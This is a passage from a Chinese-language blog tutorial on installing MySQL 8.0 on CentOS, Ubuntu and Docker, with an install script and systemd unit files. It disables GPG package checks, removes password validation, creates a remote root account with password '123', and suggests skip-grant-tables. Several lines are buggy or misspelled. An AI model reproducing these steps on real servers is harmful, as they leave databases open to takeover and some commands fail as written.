class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /etc/yum.repos.d/ | grep mysql<br>mysql-community.repo<br>mysql-community-source.repo<br><br><span class="hljs-comment">##原有的mysql 5.7之类的可以卸载，也可以disabled</span><br><br><span class="hljs-comment">##安装MySQL社区版的rpm包</span><br>yum -y install mysql80-community-release-el7-6.noarch.rpm <br><br><span class="hljs-comment">##查看现有mysql仓库</span><br>yum repolist all | grep mysql<br>mysql-cluster-7.5-community/x86_64           MySQL Cluster 7.5 C disabled<br>mysql-cluster-7.5-community-source           MySQL Cluster 7.5 C disabled<br>mysql-cluster-7.6-community/x86_64           MySQL Cluster 7.6 C disabled<br>mysql-cluster-7.6-community-source           MySQL Cluster 7.6 C disabled<br>mysql-cluster-8.0-community/x86_64           MySQL Cluster 8.0 C disabled<br>mysql-cluster-8.0-community-debuginfo/x86_64 MySQL Cluster 8.0 C disabled<br>mysql-cluster-8.0-community-source           MySQL Cluster 8.0 C disabled<br>mysql-connectors-community/x86_64            MySQL Connectors Co enabled:    199<br>mysql-connectors-community-debuginfo/x86_64  MySQL Connectors Co disabled<br>mysql-connectors-community-source            MySQL Connectors Co disabled<br>mysql-tools-community/x86_64                 MySQL Tools Communi enabled:     92<br>mysql-tools-community-debuginfo/x86_64       MySQL Tools Communi disabled<br>mysql-tools-community-source                 MySQL Tools Communi disabled<br>mysql-tools-preview/x86_64                   MySQL Tools Preview disabled<br>mysql-tools-preview-source                   MySQL Tools Preview disabled<br>mysql57-community/x86_64                     MySQL 5.7 Community disabled<br>mysql57-community-source                     MySQL 5.7 Community disabled<br>mysql80-community/x86_64                     MySQL 8.0 Community enabled:    364 <span class="hljs-comment">##目前只有mysql80-community是up的</span><br>mysql80-community-debuginfo/x86_64           MySQL 8.0 Community disabled<br>mysql80-community-source                     MySQL 8.0 Community disabled<br></code></pre></td></tr></table></figure><p>3.因为MySQL安装的时候，会检查mysql.repo源的gpgcheck，所以把gpgcheck关了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /etc/yum.repos.d/ | grep mysql<br>mysql-community-debuginfo.repo<br>mysql-community.repo<br>mysql-community-source.repo<br><br><span class="hljs-comment">##sed -i替换掉文件内部的内容</span><br><span class="hljs-comment">##sed xxx：只是在bash上显示</span><br><span class="hljs-built_in">cd</span> /etc/yum.repos.d/<br>sed -i <span class="hljs-string">&#x27;s/gpgcheck=1/gpgcheck=0/g&#x27;</span> mysql-community.repo \<br>sed -i <span class="hljs-string">&#x27;s/gpgcheck=1/gpgcheck=0/g&#x27;</span> mysql-community-source.repo \<br>sed -i <span class="hljs-string">&#x27;s/gpgcheck=1/gpgcheck=0/g&#x27;</span> mysql-community-debuginfo.repo<br><br>sed -i <span class="hljs-string">&#x27;s/gpgcheck=1/gpgcheck=0/g&#x27;</span> base.repo<br><br><span class="hljs-comment">##安装mysql8.0</span><br>yum -y install mysql-server<br></code></pre></td></tr></table></figure><p>4.初始化mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> --now mysqld<br><br><span class="hljs-comment">##初始化，8.0往后一般是不用执行了</span><br>mysql_insure_installation<br><br><span class="hljs-comment">##查看mysqld.log内的临时pass</span><br><span class="hljs-built_in">cat</span> /var/log/mysqld.log | grep temporary<br>2022-08-07T03:37:10.803391Z 6 [Note] [MY-010454] [Server] A temporary password is generated <span class="hljs-keyword">for</span> root@localhost: W6S2wp;pXiyf<br></code></pre></td></tr></table></figure><p>5.因为Cent OS 7安装mysql 8.0的话，会有密码策略的显示，是mysql内的一个变量，卸载validate_password密码验证组件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##进入到mysql cli界面</span><br>mysql&gt; UNINSTALL COMPONENT <span class="hljs-string">&#x27;file://component_validate_password&#x27;</span>;<br><br><span class="hljs-comment">##创建远程用户</span><br>use mysql<br>mysql&gt; CREATE USER <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;123&#x27;</span>;<br>Query OK, 0 rows affected (0.04 sec)<br><br>mysql&gt; grant all privileges on *.* to <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, 0 rows affected (0.03 sec)<br><br>flush privileges;<br><br><span class="hljs-comment">##登录</span><br>mysql -uroot -p123<br></code></pre></td></tr></table></figure><p>6.Navicat验证</p><h2 id="3-ubuntu-20-04安装mysql-8-0"><a href="#3-ubuntu-20-04安装mysql-8-0" class="headerlink" title="3.ubuntu 20.04安装mysql 8.0"></a>3.ubuntu 20.04安装mysql 8.0</h2><p>查看apt list | grep mysql-server</p><p><img src="2792175-20220828181322423-411191606.png" alt="image-20220807122247163"></p><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">apt install mysql-server -y<br>systemctl status mysql<br>systemctl status mysql<br></code></pre></td></tr></table></figure><h2 id="4-rpm二进制包安装MySQL-Linux-generic通用版-—-gt-已编译"><a href="#4-rpm二进制包安装MySQL-Linux-generic通用版-—-gt-已编译" class="headerlink" title="4.rpm二进制包安装MySQL(Linux generic通用版)—&gt;已编译"></a>4.rpm二进制包安装MySQL(Linux generic通用版)—&gt;已编译</h2><p>通用安装脚本：需要先在官网下载好MySQL 二进制包(最新)</p><p>需要在测试机上测试一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#********************************************************************</span><br><span class="hljs-comment">#Author:wangxiaochun</span><br><span class="hljs-comment">#QQ: 29308620</span><br><span class="hljs-comment">#Date: 2020-02-12</span><br><span class="hljs-comment">#FileName：install_offline_mysql5.7or8.0_for_centos.sh</span><br><span class="hljs-comment">#URL: http://www.wangxiaochun.com</span><br><span class="hljs-comment">#Description：The test script</span><br><span class="hljs-comment">#Copyright (C): 2020 All rights reserved</span><br><span class="hljs-comment">#********************************************************************</span><br><span class="hljs-comment">#MySQL Download URL: https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.29-linux-glibc2.12-x86_64.tar.gz</span><br><span class="hljs-comment">#http://mirrors.163.com/mysql/Downloads/MySQL-5.7/mysql-5.7.31-linux-glibc2.12-x86_64.tar.gz</span><br><span class="hljs-comment">#http://mirrors.163.com/mysql/Downloads/MySQL-8.0/mysql-8.0.23-linux-glibc2.12-x86_64.tar.xz</span><br><br>. /etc/init.d/functions <br>SRC_DIR=`/data/mysql`<br><br><br><span class="hljs-comment">##需要先在官网下载好MySQL 二进制包(最新)</span><br>MYSQL=<span class="hljs-string">&#x27;mysql-8.0.30-linux-glibc2.12-x86_64.tar.xz&#x27;</span><br><span class="hljs-comment">#MYSQL=&#x27;mysql-8.0.28-linux-glibc2.12-x86_64.tar.xz&#x27;</span><br><span class="hljs-comment">#MYSQL=&#x27;mysql-8.0.23-linux-glibc2.12-x86_64.tar.xz&#x27;</span><br>MYSQL_ROOT_PASSWORD=123<br><br><br>COLOR=<span class="hljs-string">&#x27;echo -e \E[01;31m&#x27;</span><br>END=<span class="hljs-string">&#x27;\E[0m&#x27;</span><br><br><span class="hljs-function"><span class="hljs-title">check</span></span> ()&#123;<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$UID</span> -ne 0 ]; <span class="hljs-keyword">then</span><br>  action <span class="hljs-string">&quot;当前用户不是root,安装失败&quot;</span> <span class="hljs-literal">false</span><br>  <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">cd</span>  <span class="hljs-variable">$SRC_DIR</span><br><br><span class="hljs-keyword">if</span> [ !  -e <span class="hljs-variable">$MYSQL</span> ];<span class="hljs-keyword">then</span><br>        <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;缺少<span class="hljs-variable">$&#123;MYSQL&#125;</span>文件&quot;</span><span class="hljs-variable">$END</span><br><span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;请将相关软件放在<span class="hljs-variable">$&#123;SRC_DIR&#125;</span>目录下&quot;</span><span class="hljs-variable">$END</span><br>        <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">elif</span> [ -e /usr/local/mysql ];<span class="hljs-keyword">then</span><br>        action <span class="hljs-string">&quot;数据库已存在，安装失败&quot;</span> <span class="hljs-literal">false</span><br>        <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">return</span><br><span class="hljs-keyword">fi</span><br>&#125; <br><br><span class="hljs-function"><span class="hljs-title">install_mysql</span></span>()&#123;<br>    <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;开始安装MySQL数据库...&quot;</span><span class="hljs-variable">$END</span><br>    <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;安装相关依赖&quot;</span><span class="hljs-variable">$END</span><br>    yum  -y -q install libaio numactl-libs<br>    <br>    <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;解压目录&quot;</span><span class="hljs-variable">$END</span><br>    <span class="hljs-comment">#将MYSQL 2进制包解压到/usr/local，这个是写好的；tar xf xxx -C：解压到对应的目录</span><br>    tar xf <span class="hljs-variable">$MYSQL</span> -C /usr/local/<br>    <br>    <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;制作软连接&quot;</span><span class="hljs-variable">$END</span><br>    <span class="hljs-comment">#做一个软连接，将包link到/usr/local下，这里作为默认目录，而不是去修改他的包名</span><br>    <span class="hljs-comment">##sed打印出包名</span><br>    <span class="hljs-comment">##[root@rocky ~]#echo mysql-8.0.30-linux-glibc2.12-x86_64.tar.xz | sed -nr &#x27;s/^(.*[0-9]).*/\1/p&#x27;</span><br><span class="hljs-comment">##mysql-8.0.30-linux-glibc2.12-x86_64</span><br>    MYSQL_DIR=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$MYSQL</span>| sed -nr <span class="hljs-string">&#x27;s/^(.*[0-9]).*/\1/p&#x27;</span>`<br>    <span class="hljs-built_in">ln</span> -s  /usr/local/<span class="hljs-variable">$MYSQL_DIR</span> /usr/local/mysql<br>    <br>    <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;创建mysql用户&quot;</span><span class="hljs-variable">$END</span><br>    <span class="hljs-comment">##安装mysql必须要用roo$COLOR&quot;制作软连接&quot;$ENDt用户/用户组，chown -R表示递归修改权限</span><br>    <span class="hljs-built_in">chown</span> -R  root.root /usr/local/mysql/<br>    <span class="hljs-built_in">id</span> mysql &amp;&gt; /dev/null || &#123; useradd -s /sbin/nologin -g mysql -r  mysql ; action <span class="hljs-string">&quot;创建mysql用户&quot;</span>; &#125;<br>    <br>    <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;准备mysql路径&quot;</span><span class="hljs-variable">$END</span><br>    <span class="hljs-comment">##准备mysql客户端的指令，包括路径等</span><br>    <span class="hljs-comment">##准备环境变量</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PATH=/usr/local/mysql/bin/:$PATH&#x27;</span> &gt; /etc/profile.d/mysql.sh<br>    .  /etc/profile.d/mysql.sh<br><span class="hljs-built_in">ln</span> -s /usr/local/mysql/bin/* /usr/bin/<br>    <span class="hljs-built_in">cat</span> &gt; /etc/my.cnf &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">    </span><br><span class="hljs-string">##往my.cnf内写好对应的参数变量，比如对应的数据目录，日志目录，运行Pid</span><br><span class="hljs-string">##server-id可以指定为IP的最后一位</span><br><span class="hljs-string"></span><br><span class="hljs-string">##[mysqld]服务器端配置</span><br><span class="hljs-string">[mysqld]</span><br><span class="hljs-string">server-id=`hostname -I|awk &#x27;&#123;print $1&#125;&#x27;`</span><br><span class="hljs-string">log-bin ##开启binlog</span><br><span class="hljs-string">datadir=/data/mysql ##指定数据目录dir</span><br><span class="hljs-string">socket=/data/mysql/mysql.sock   ##指定本地socket连接                                                                                                 </span><br><span class="hljs-string">log-error=/data/mysql/mysql.log ##错误日志</span><br><span class="hljs-string">pid-file=/data/mysql/mysql.pid  ##mysql.pid进程</span><br><span class="hljs-string"></span><br><span class="hljs-string">##客户端配置，或者叫mysql端，[mysql]</span><br><span class="hljs-string">[client]</span><br><span class="hljs-string">socket=/data/mysql/mysql.sock ##本地客户端通过socket连接到本地localhost用户</span><br><span class="hljs-string"></span><br><span class="hljs-string">EOF</span><br><span class="hljs-comment">##创建data数据目录</span><br>    [ -d /data ] || <span class="hljs-built_in">mkdir</span> /data<br>mysqld --initialize-insecure --user=mysql --datadir=/data/mysql <br>    <span class="hljs-built_in">cp</span> /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld <span class="hljs-comment">##启动mysqld</span><br>    chkconfig --add mysqld<br>    chkconfig mysqld on<br>    service mysqld start<br>    [ $? -ne 0 ] &amp;&amp; &#123; <span class="hljs-variable">$COLOR</span><span class="hljs-string">&quot;数据库启动失败，退出!&quot;</span><span class="hljs-variable">$END</span>;<span class="hljs-built_in">exit</span>; &#125;<br>    <span class="hljs-comment">#MYSQL_OLDPASSWORD=`awk &#x27;/A temporary password/&#123;print $NF&#125;&#x27; /data/mysql/mysql.log`</span><br>    <span class="hljs-comment">#mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &amp;&gt;/dev/null</span><br><span class="hljs-built_in">sleep</span> 3<br>    mysqladmin  -uroot  password <span class="hljs-variable">$MYSQL_ROOT_PASSWORD</span> &amp;&gt;/dev/null<br>    action <span class="hljs-string">&quot;数据库安装完成&quot;</span> <br>&#125;<br><br>check<br>install_mysql<br><br><span class="hljs-comment">##修改MySQL内的显示prompt</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">export</span> MYSQL_PS1=<span class="hljs-string">&quot;(\\u@\\h) [\\d]\\&gt;&quot;</span> &gt;&gt; .bashrc<br><span class="hljs-built_in">source</span> .bashrc<br></code></pre></td></tr></table></figure><p>Linux通用版，已经经过源码编译的包进行安装</p><p>MySQL程序安装分为程序路径(APP)和数据路径(DATA)</p><p>1.下载好对应的二进制包，下载社区版的服务器端</p><p><img src="2792175-20220828181322752-1035794337.png" alt="image-20220811231642480"></p><p>下载这个tar包，注意服务器的架构位数</p><p><img src="2792175-20220828181323191-117223815.png" alt="image-20220811231730080"></p><p>2.安装相关依赖包，创建mysql服务用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install libaio numactl-libs<br><br><span class="hljs-comment">##建立MySQL相关用户</span><br>-r：建立系统账号，系统账号在0-1000号之间<br>-g mysql：属于Mysql组<br>-s:用户登陆后使用的shell环境<br>useradd -r -g mysql -s /sbin/nologin mysql<br></code></pre></td></tr></table></figure><p>3.解压数据包到对应路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">tar xf <br></code></pre></td></tr></table></figure><h3 id="二进制包安装可能出现的问题"><a href="#二进制包安装可能出现的问题" class="headerlink" title="二进制包安装可能出现的问题"></a>二进制包安装可能出现的问题</h3><p>1.缺少lib依赖，在登陆mysql的时候</p><p><img src="2792175-20220828181323512-1333718380.png" alt="image-20220814102137009"></p><p>解决办法：先检查libaio依赖包是否有安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">rpm -q libaio numactl-libs<br></code></pre></td></tr></table></figure><p>发现安装的是6.1版本，系统内只认so.5包，所以执行ln -s软连接，将我们新安装的包ln -s到系统的so.5 lib依赖中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">ln -s /usr/lib64/libtinfo.so.6.1 /usr/lib64/libtinfo.so.5<br></code></pre></td></tr></table></figure><p>成功</p><p><img src="2792175-20220828181323778-1633879650.png" alt="image-20220814102353351"></p><p>2.无法实现登录到caching</p><p>在/etc/my.cnf内写入skip-grant-tables</p><p>重启mysql服务</p><h3 id="实现使用systemd管理mysqld-service：编写服务脚本"><a href="#实现使用systemd管理mysqld-service：编写服务脚本" class="headerlink" title="实现使用systemd管理mysqld.service：编写服务脚本"></a>实现使用systemd管理mysqld.service：编写服务脚本</h3><p>nginx.service编写案例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">###写的路径，也可以写在/lib，/lib就是/usr/lib的link</span><br><br><span class="hljs-comment"># /usr/lib/systemd/system/nginx.service </span><br>[Unit]<br>Description=The nginx HTTP and reverse proxy server <span class="hljs-comment">##服务说明</span><br>After=network-online.target remote-fs.target nss-lookup.target <span class="hljs-comment">##依赖关系：有网络network，remote远程主机；需要先启动这些服务</span><br>Wants=network-online.target <span class="hljs-comment">##必须依赖：网络服务</span><br><br>[Service]<br>Type=forking<br>PIDFile=/run/nginx.pid<br><span class="hljs-comment"># Nginx will fail to start if /run/nginx.pid already exists but has the wrong</span><br><span class="hljs-comment"># SELinux context. This might happen when running `nginx -t` from the cmdline.</span><br><span class="hljs-comment"># https://bugzilla.redhat.com/show_bug.cgi?id=1268621</span><br>ExecStartPre=/usr/bin/rm -f /run/nginx.pid <span class="hljs-comment">##启动进程，启动前需要做什么---&gt;先删除掉原有的nginx.pid进程</span><br>ExecStartPre=/usr/sbin/nginx -t<span class="hljs-comment">##检查nginx的配置文件是否有问题：nginx -t---&gt;检查的是nginx.conf，检查语法错误</span><br>ExecStart=/usr/sbin/nginx<span class="hljs-comment">##执行systemctl start xxx的时候，执行的就/usr/sbin/nginx这个可执行文件，后续如果是源码编译安装想放到systemd执行，可以写成例如/usr/local/nginx/sbin/nginx或者/usr/local/tomcat/bin/startup.sh</span><br>ExecReload=/usr/sbin/nginx -s reload <span class="hljs-comment">##执行reload，nginx执行文件就是 nginx -s reload</span><br><br>KillSignal=SIGQUIT<br>TimeoutStopSec=5<br>KillMode=process<br>PrivateTmp=<span class="hljs-literal">true</span><br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>进入到对应目录，创建.service文件，授权644</p><p>配置完成后，记得重新加载守护进程，systemctl daemon-reload</p><p>预检查：ExecStartPre：没有这个mysqld</p><p><img src="2792175-20220828181324083-943430986.png" alt="image-20220814111924630"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/lib/systemd/system<br><span class="hljs-built_in">touch</span> mysqld.service<br><span class="hljs-built_in">chmod</span> 644 mysqld.service<br><br>[Unit]<br>Description=MySQL Community Server <br>After=network.target <span class="hljs-comment">##服务依赖，显示在bash上面</span><br>After=syslog.target<br><br>[Install]<br>WantedBy=multi-user.target<br>Alias=mysqld.service<br><br>[Service]<br><span class="hljs-comment">##这里是整个service</span><br>User=mysql<br>Group=mysql<br><br>PIDfile=/data/mysql/mysql.pid<br><br><span class="hljs-comment"># Execute pre and post scripts as root</span><br>PermissionsStartOnly=<span class="hljs-literal">true</span><br><br><span class="hljs-comment"># Needed to create system tables etc.</span><br><span class="hljs-comment">#ExecStartPre=/usr/bin/mysql-systemd-start pre</span><br><br><span class="hljs-comment"># Start main service</span><br><span class="hljs-comment">#ExecStart=/usr/bin/mysqld_safe --basedir=/usr</span><br><span class="hljs-comment">#ExecStart=/usr/local/mysql/bin/mysqld --daemonize --pid-file=/data/mysql/mysql.pid $MYSQLD_OPTS</span><br><span class="hljs-comment">##启动脚本，启动对应的执行文件，类似nginx</span><br>ExecStart=/usr/local/mysql/bin/mysqld<br><br><span class="hljs-comment"># Don&#x27;t signal startup success before a ping works</span><br><span class="hljs-comment">#ExecStartPost=/usr/bin/mysql-systemd-start post</span><br><br><span class="hljs-comment"># Give up if ping don&#x27;t get an answer</span><br>TimeoutSec=600<br><br>Restart=always<br>PrivateTmp=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>编辑PS1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">export</span> MYSQL_PS1=<span class="hljs-string">&quot;(\\u@\\h) [\\d]\\&gt;&quot;</span> &gt;&gt; .bashrc<br><span class="hljs-built_in">source</span> .bashrc<br></code></pre></td></tr></table></figure><h2 id="5-源码包安装MySQL—-gt-需要先进行编译cmake"><a href="#5-源码包安装MySQL—-gt-需要先进行编译cmake" class="headerlink" title="5.源码包安装MySQL—&gt;需要先进行编译cmake"></a>5.源码包安装MySQL—&gt;需要先进行编译cmake</h2><p>编译要求：编译机器的内存必须足够大，就像在java环境编译java包一样，同样是很吃PC机的内存的</p><p>建议调整vmware虚拟机：8c16g</p><h2 id="6-docker安装MySQL"><a href="#6-docker安装MySQL" class="headerlink" title="6.docker安装MySQL"></a>6.docker安装MySQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install docker-ce<br>docker search mysql:8<br></code></pre></td></tr></table></figure><h1 id="MySQL安全加固"><a href="#MySQL安全加固" class="headerlink" title="MySQL安全加固"></a>MySQL安全加固</h1><p>ODBC：微软调用数据库的接口</p><p>JDBC：JAVA语言调用SQL的语法，jdbc：3306等等</p><p>MySQL和mariadb的关系：mariadb是MySQL的一个分支，在Cent OS 7上自带mariadb数据库，语法结构，数据库结构完全一致</p><p>存储引擎：innodb，intradb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##yum info mysql-server</span><br><span class="hljs-comment">##yum info mariadb</span><br><span class="hljs-comment">##apt list mysql-server</span><br>Cent OS 7：自带mariadb Version     : 5.5.68<br>Cent OS 8(rocky 8.6)：自带MySQL 8.0.26<br>ubuntu 20.04：自带MySQL 8.0.30<br><br>sed -i <span class="hljs-string">&#x27;s/DNS/#DNS/g&#x27;</span> /etc/sysconfig/network-scripts/ifcfg-ens33 ; systemctl restart network<br>mysql&gt; status <span class="hljs-comment">##查看MySQL状态，可以看MySQL一些版本，字符集等</span><br>mysql&gt; status<br>--------------<br>mysql  Ver 8.0.30 <span class="hljs-keyword">for</span> Linux on x86_64 (MySQL Community Server - GPL)<br><br>Connection <span class="hljs-built_in">id</span>:8<br>Current database:<br>Current user:root@localhost<br>SSL:Not <span class="hljs-keyword">in</span> use<br>Current pager:stdout<br>Using outfile:<span class="hljs-string">&#x27;&#x27;</span><br>Using delimiter:;<br>Server version:8.0.30 MySQL Community Server - GPL<br>Protocol version:10<br>Connection:Localhost via UNIX socket<br>Server characterset:utf8mb4  <span class="hljs-comment">##指定字符集</span><br>Db     characterset:utf8mb4<br>Client characterset:utf8mb4<br>Conn.  characterset:utf8mb4<br>UNIX socket:/var/lib/mysql/mysql.sock<br>Binary data as:Hexadecimal<br>Uptime:5 min 4 sec<br><br>Threads: 2  Questions: 5  Slow queries: 0  Opens: 119  Flush tables: 3  Open tables: 38  Queries per second avg: 0.016<br>--------------<br></code></pre></td></tr></table></figure><h2 id="MySQL8-0修改密码"><a href="#MySQL8-0修改密码" class="headerlink" 